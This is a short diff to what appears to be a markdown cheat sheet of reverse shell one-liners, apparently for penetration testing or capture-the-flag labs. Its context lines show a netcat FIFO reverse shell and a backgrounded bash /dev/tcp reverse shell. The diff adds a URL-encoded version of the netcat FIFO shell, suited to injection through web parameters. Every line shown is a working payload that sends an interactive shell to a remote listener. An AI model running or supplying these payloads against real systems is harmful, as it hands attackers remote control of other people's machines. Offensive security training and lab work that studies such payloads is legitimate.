@@ -286,6 +286,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 {% endcode %}
 
+{% code title="FIFO Encoded" overflow="wrap" %}
+```url
+rm%20/tmp/f%3B%20mkfifo%20/tmp/f%3B%20cat%20/tmp/f%20%7C%20/bin/sh%20-i%202%3E%261%20%7C%20nc%2010.10.16.10%204444%20%3E%20/tmp/f
+```
+{% endcode %}
+
 {% code title="Run it in the background" %}
 ```sh
 nohup bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" &
